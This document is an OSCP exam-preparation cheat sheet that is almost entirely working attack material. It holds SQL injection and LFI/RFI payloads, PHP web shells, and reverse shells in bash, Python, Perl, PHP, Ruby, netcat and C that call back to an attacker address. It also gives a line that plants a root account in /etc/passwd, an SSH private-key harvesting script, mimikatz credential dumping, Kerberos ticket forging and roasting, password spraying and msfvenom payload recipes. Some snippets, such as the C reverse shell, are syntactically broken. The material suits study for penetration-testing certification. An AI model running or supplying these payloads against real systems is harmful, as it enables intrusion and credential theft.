# OSCP-shortsheet
- 🚀 Prepared as part of my OSCP journey.

#Resources
- https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
- https://hacktricks.boitatech.com.br/windows/active-directory-methodology/silver-ticket
- https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
- https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Active%20Directory.md
- https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
- https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/
- https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
- https://notes.benheater.com/books/network-pivoting/page/penetrating-networks-via-chisel-proxies
- https://oscp.cyberdefendersprogram.com/oscp-the-exam    (msfvenom is allowed for unlimited use on the exam to create your reverse shell payloads (shell/reverse_tcp and shell_reverse_tcp))

# Table of Content
- [Active Directory Pentesting](#active-directory-pentesting)
  - [Enumeration](#enumeration)
    - [Powerview](#powerview)
   
# Initial Access 

## Enumeration

### Port Scan
```bash
#namp
nmap -sS -Pn -n -Ax.x.x.x
nmap -SU -p- -- max-retries 0 -min-rate 500 x.x.x.x

#powershell's port scan
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts x.x.x.x"
```
### Web scan
```bash
#Nikto
nikto -h x.x.x.x

#Gobuster
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -t 20
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt-t 20 -x .txt,.php

#Wfuzz
wfuzz -w /usr/share/seclists/Discovery/Web_Content/common.txt -- hc 400,404,500 http://x.x.x.x/FUZZ
wfuzz -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -- hc 400,404,500 http://x.x.x.x/FUZZ

#cmsmap - scans for vuls in CMS
cmsmap.py https://x.x.x.x

#wpscan - scans for vuls in wordpress
wpscan -url https://x.x.x.x
#bruteforce wpscan
wpscan -url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/Passwords/best1050.txt -- username admin -- threads 10
```

### SMB Enumeration
```bash
smbmap -H x.X.X.x
smbclient -L X.X.X.x
nmap -- script=smb-check-vulns.nse x.x.x.x
smbmount //x.x.x.x/share /mnt -o username=xxx,workgroup=xxx
mount -t cifs //x.x.x.x/share /mnt
mount -t cifs -o username=xxx,password=xxx //x.x.x.x/share /mnt
smbclient \\\x.x.x.x\\share
```

### SNMP Enumeration
```bash
snmpwalk -c public -v1 x.x.x.x
```

### SQL injection
```bash
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```
#### Blind SQL Injection - This can be identified by Time-based SQLI
```bash
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

#### Manual Code Execution
```bash
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
```

#### SQLi resources
- https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/WEB/CHEATSHEETS/sqli.md
- https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md


#### LFI - often chained with php exploits. upload php payload and use LFI to read the payload and execute
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
- https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/
```bash
#LFI check - Unix
<base url>/../../../../../../etc/passwd
<base url>/../../../../../../etc/passwd%00
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2500


#LFI check - Windows
<base url>/../../../../../../../windows/system32/drivers/etc/hosts
.././../../../../../../../../windows/system32/drivers/etc/hosts
../../../../../../../../../../windows/system32/drivers/etc/hosts%00
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts%2500

#LFI exploit
#(1) expect://
http://x.x.x.x/blah?parameter=expect://whoami

#(2) data://
http://x.x.x.x/blah?parameter=data://text/plain;base64,PD8gcGhwaW5mbygpOyA/Pg==
# the base64 encoded payload is: <? phpinfo(); ?>

#(3) input://
http://x.x.x.x/blah?parameter=php://input
# POST data (using Hackbar)
<? phpinfo(); ?>

#Base64 conversion
echo -n '<?php system($_GET['c']); ?>' | base64
#output is PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
```

#### RFI
```bash
http://example.com/index.php?page=http://example.evil/shell.txt

#Null Byte #
http://example.com/index.php?page=http://example.evil/shell.txt%00
```

## Reverse Shell payload
- https://guide.offsecnewbie.com/shells
- Use port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
- If connections drops or can not be established, try different ports 80,443,8080...
```bash
#Bash
bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
/bin/bash -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
/bin/sh -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
```

```Python
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```Perl
perl -e 'use
Socket;$i="x.x.x.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh-i");};'

#Perl Windows
perl -MIO -e '$c=new IO :: Socket :: INET(PeerAddr,"x.x.x.x:4444");STDIN->fdopen($c,r);$ ~- >fdopen($c,w);system$_ while<>;'
```

```PHP
php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```Ruby
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
#Netcat
nc -e /bin/sh x.x.x.x 4444
nc -e cmd.exe x.x.x.x 4444
/bin/sh | nc x.x.x.x 4444
rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x 4444 0/tmp/p
```

```c
// gcc reverse.c -o reverse

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main (int argc, char ** argv)

int scktd;
struct sockaddr_in client;

client.sin_family = AF_INET;
client.sin_addr.s_addr = inet_addr("x.x.x.x"); // attacker IP
client.sin_port = htons(4444); // attacker port

scktd = socket(AF_INET,SOCK_STREAM,0);
connect(scktd,(struct sockaddr *)&client,sizeof(client));

dup2(scktd,0); // STDIN
dup2(scktd,1); // STDOUT
dup2(scktd,2); // STDERR

execl("/bin/sh","sh","-i",NULL,NULL);

return 0;
```

## Web Shell

```php
#wordpress
http://x.x.x.x/404.php?cmd=id
http://x.x.x.x/404.php?cmd=nc x.x.x.x 4444 -e /bin/sh

<? php echo shell_exec($_GET['cmd']); ?>
<? passthru($_GET["cmd"]); ?>
<? php echo shell_exec($_GET["cmd"]); ?>

#phpMyAdmin
<? php system("/usr/local/bin/wget http://x.x.x.x:4444/php-reverse-shell.php -O /var/tmp/hodor.php 2>&1"); ?>

#SQLQuery
SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"

#LFI reverse shell
http://x.x.x.x/blah?parameter=/etc/passwd%00
```

# Window Priv Esc
## Enumeration
### User
```bash
#which user
whoami

#what privilege
whoami /priv

#what other users
net users

#check for admin privilege
net localgroup administrators

#list all saved creds from Credential Manager
cmdkey /list

#users who are logged in in current session
qwinsta
```

### Password
```
#fgdump.exe
/usr/share/windows-binaries/fgdump/fgdump.exe
C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump
```

### Network
```bash
#check ports that are alr opened
netstat -ano

#check host -  IP address associated with a hostname, bypassing the DNS lookup process.
C:\WINDOWS\System32\drivers\etc\hosts

#check firewall
netsh firewall show state
netsh firewall show config
netsh dump
```

### Use Powerup https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
```bash
IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/PowerUp.ps1')
powershell.exe -nop -exec bypass
PS C:\> Import-Module .\PowerUp.ps1
PS C:\> Invoke-AllChecks
```

### Use Sherlock https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1 
```bash
IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/Sherlock.ps1')
powershell.exe -nop -exec bypass
PS C:\> Import-Module .Sherlock.ps1
PS C:\> Find-AllVulns
```

### Windows Exploits DB
- https://github.com/SecWiki/windows-kernel-exploits
- https://github.com/abatchy17/WindowsExploits

# Linux Priv Esc
- https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
## Enumeration
### User and system details
```bash
#7.Escalation Path Sudo - see what commands can be run by current user (as root) that do not require password
sudo -l

#find out commands that usually require the sudo command can be run without sudo
cat /etc/sudoers

#if any user that belongs to the group wheel can execute anything as sudo, to become root
sudo su

#check linux system details
cat /etc/*release*
uname -a
rpm -q kernel
dmesg | grep -i linux

#writable folders in linux (doesnt mean executable)
/tmp
/dev/shm

#services currently run by root
ps aux|grep root
ps -ef|grep root

#installed app
ls -lah /usr/bin/
ls -lah /sbin/
dpkg -l
rpm -qa
ls -lah /var/cache/apt/archives
ls -lah /var/cache/yum/

#scheduled task
crontab -l
ls -la /etc/cron*
ls -lah /var/spool/cron
ls -la /etc/|grep cron
cat /etc/crontab
cat /etc/anacrontab

#finding password in files
grep -rnw '/etc/passwd' -e 'root'

#finding the word "password" in files
grep -R 'password' config.php
find / -type f -exec grep -H 'password' \; 2>/dev/null
grep -R -i "password" 2> >(grep -v 'Permission denied' >&2)
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name " *. php" -print0 | xargs -0 grep -i -n "var $password"
```
### Linux SSH
- private key = id_rsa ,id_dsa (SSH2 only)
- public key = id_rsa.pub, id_dsa.pub (SSH2 only)
```bash
#find id_rsa using bash script
#!/bin/bash
for X in $(cut -f6 -d:' /etc/passwd |sort |uniq); do
  if [-s "${X}/.ssh/id_rsa" ]; then
    echo "### ${X}: "
    cat "${X}/.ssh/id_rsa"
    echo ""
  fi
done

#find id_dsa using bash script
#!/bin/bash
for X in $(cut -f6 -d':' /etc/passwd |sort |uniq); do
  if [-s "${X}/.ssh/id_dsa" ]; then
    echo "### ${X}: "
    cat "${X}/.ssh/id_dsa"
    echo
  fi
done
```
### Find SGID SUID GUID bit
```bash
find / -perm -1000 -type d 2>/dev/null

SGID (chmod 2000):
find / -perm -g=s -type f 2>/dev/null

#SUID (chmod 4000) :
find / -perm -u=s -type f 2>/dev/null
find /* -user root -perm -4000 -print 2>/dev/null

#SUID or GUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

#Add user to /etc/passwd and root group
echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
```

### Use LinPEAS and LinEnum and Linprivchecker
- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
- https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py

### Linux Exploits DB
- https://github.com/SecWiki/linux-kernel-exploits
- https://github.com/xairy/linux-kernel-exploitation

# Active Directory Pentesting
## Enumeration
- To check local administrators in domain joined machine

```powershell
net localgroup Administrators
```

### Powerview

```bash
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
Get-NetGroupMember -GroupName "Domain Admins"       #get SID, Group Doamin name, group name
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domain
Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name

#Key commands for enumerations
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-NetGroup | select cn    #user list for password attacks
Get-DomainUser -PreauthNotRequired #quick win for AS-REP 
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion #attack old OS and see which are web server or file server
Find-LocalAdminAccess #scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-NetSession -ComputerName *client74* #
Get-ObjectAcl -Identity *stephanie* #see ObjectSID, ActiveDirectoryRights, SecurityIdentifier (securityidentifier has certain rights on objectSID)
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName
Invoke-UserHunter
Invoke-Portscan -Hosts sql01

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName #method 1
Convert-SidToName *S-1-5-21-1987370270-658905905-1781884369-1104*  #method 2
Find-DomainShare #find the shares in the domain. ##TIPS: ls all the NAME (folder) found in Find-DomainShare
ls \\*FILES04*\*docshare*   #name=docshare, computername=FILES04.corp.com
ls \\*dc1.corp.com*\sysvol\*corp.com*\ # %SystemRoot%\SYSVOL\Sysvol\domainname on the domain controller and every domain user has access to it.
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" #decrypt cpassword in Group Policy Preferences (GPP) in kali


Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
```
### Crackmapexec

```bash
# Enumerate users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

# Enumerate domain groups
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# Enumerate local users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users

# Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt

# Enumerate available shares
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# Check logged in users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers

# Get the password policy
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
```

### Bloodhound

- Collection methods - database

```bash
# Sharphound - transfer sharphound.ps1 into the compromised machine
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
      e.g. Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip
```

- Running Bloodhound

```bash
sudo neo4j console
# then upload the .json files obtained

sudo bloodhound
# then upload the .zip files obtained
```

## **Attacking Active Directory Authentication**

<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
</aside>

### Tools to dump hashes (tool: secretsdump.py https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
```bash
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

### Password Spraying

- Dump passwords from memory using mimikatz
```bash
PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
```

-Dump passwords using impacket (try all user accounts that are found using net user /domain)
```bash
impacket-secretdump exam.com/apachesvc@192.168.1xx.101
```

- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
  ```bash
  #using LDAP and ADSI to perform a low and slow password attack against AD users
  .\Spray-Passwords.ps1
    .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
  ```
  
- Spray with known password on list of found usernames
```bash
# Crackmapexec uses SMB - check if the output shows 'Pwned!'
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
        e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
        e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
        e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
        users.txt from Get-NetUser

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

### Pass the hash

- Access local SAM database and dump all local hashes

```powershell
PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
```

- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)

```powershell
#dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
#dump credentials stored in LSASS and cache hashes
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Pass the hash

```bash
crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
        crackmapexec 192. 168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
```

### Silver Tickets

-Silver Ticket Default Groups:
<aside>
Domain Users SID: S-1-5-21<DOMAINID>-513
Domain Admins SID: S-1-5-21<DOMAINID>-512
Schema Admins SID: S-1-5-21<DOMAINID>-518
Enterprise Admins SID: S-1-5-21<DOMAINID>-519
Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
</aside>

- In Windows, Mimikatz can be used to craft the ticket. Next, the ticket is injected with Rubeus, and finally a remote shell can be obtained thanks to PsExec.
  
- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)

```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID

```powershell
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
```

- Forging silver ticket (TGS) Ft **Mimikatz**
<aside>
Forging a TGS (and included PAC)
Requires the machine account password (key) from the KDC
Can be used to directly access any service (without touching DC)
</aside>

```bash
mimikatz.exe
prvilege::debug
#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ptt
      mimikatz # kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target: CorpSqlServer.corp.com: 1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket
#using aeskey generate the Silver Ticket (TGS) and inject it into memory
kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME

# Checking available tickets in memory with klist
ps> klist
```

- Inject the ticket (not needed if the TGS is already loaded in current session)

```bash
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi
```

- Obtain a shell

```bash
cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
```

### Golden Ticket Ft **Mimikatz**
<aside>
Forging a TGT (and the included PAC)
Requires tje krbtgt key, the “master” encryption key from the KDC
Can be used to request any TGS from the Domain Controller
</aside>

```bash
#getting krbtgt (user: krbtgt, NTLM: krbtgt hash)
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch

#using krbtgt hash via mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
        mimikatz # kerberos :: golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi

 #List tickets in memory
klist

#using krbtgt hash via Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

#After running above code to generate golden ticket, the golden ticket will be automaticallys submiited for current session
#to launch cmd using the current session validated by golden ticket
mimikatz # misc::cmd
mimikatz # misc::cmd whoami
```

### Kerberoasting
<aside>
Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
Kerberoasting requires a valid domain account.
Three step process:
- Find SPN tied to user accounts through LDAP (service accounts)
- Request a TGS for each SPN
- Crack the TGS offline to recover the service account's password
</aside>

```bash
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

# cracking TGS hashes
hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
        hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
```

### Manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)

```bash
#get SPN
impacket-GetUserSPNs exam.com/apachesvc -dc-ip 172.16.1xx.100

#requesting TGS ticket, i.e. .kirbi
PS C:\Users\offsec> Add-Type -AssemblyName System. IdentityModel
PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'SPN'
        PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
mimikatz # kerberos :: list /export

#crack hash using tgsrepcrack.py
/usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
#crack hash using kirbi2john.py
python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
```

### AS-REP roasting
- Find user account with user account option "Do not require Kerberos preauthentication" ENABLED, then obtain their password thru AS-REP hashes
#### on Kali
```bash
# [KALI] find users (not user1) who "Do not require Kerberos preauthentication"
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/user1

# [KALI] hashcat with option 18200 for AS-REP, to obtain the plaintext password of user who "Do not require Kerberos preauthentication"
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
#### on windows (use Rubeus)
```bash
#extract AS-REP hash
.\Rubeus.exe asreproast /nowrap

#copy to kali to run hash cat
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Targeted AS-REP roasting
- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of the user to not require Kerberos preauthentication
- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting
- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash

# MISC

## MSFVenom

### Check msfvenom payloads
```bash
msfvenom -l payloads
```

###
```bash
msfconsole
use exploit/multi/handler
set lhost x.x.x.x
set Iport 4444
exploit

#windows (stageless)
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > shell.asp

#Linux (stageless)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f war > shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > shell.jsp
```

### MSFVenom Reverse Shell Payload Cheatsheet (see stageless)
- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ 
```bash 
#Non-Meterpreter Binaries

#Staged Payloads for Windows
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

#Stageless Payloads for Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

#Staged Payloads for Linux
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

#Stageless Payloads for Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

#Non-Meterpreter Web Payloads
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

## Shell File Transfer Cheat Sheet
### [https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ ](https://steflan-security.com/shell-file-transfer-cheat-sheet/)
#### Hosting files
| Command  | Description |
| ------------- | ------------- |
| python -m SimpleHTTPServer [PORT] | Python HTTP Server modules |
| python3 -m http.server [PORT]	| Python HTTP Server modules |
| service apache2 start; systemctl start apache2;	| Apache web server, requires to place files in the /var/www/html/ directory |
| service nginx start; systemctl start nginx	| Nginx web server, requires to place files in or /usr/share/nginx/html or /var/www/html |
| php -S 0.0.0.0:PORT	| PHP builtin web server bundle |
| nc -q 0 -lvp 443 < file	| Netcat listener to transfer files |
| nc -nv IP_ADDR 443 < file	| Netcat command to send files |
| smbserver.py SHARE share_dir	| Impacket’s smbserver.py script simulates a SMB server |
| service smbd start; systemctl start smbd	| Linux Samba, a share has to be added to /etc/samba/smb.conf |
| service pure-ftpd start; systemctl start pure-ftpd; service proftpd start; systemctl start proftpd	| Services such as pure-ftpd and proftpd can be used to setup FTP servers |
| atftpd –daemon –port 69 ftp_dir	| The atftpd utility allows to easily setup a TFTP server |
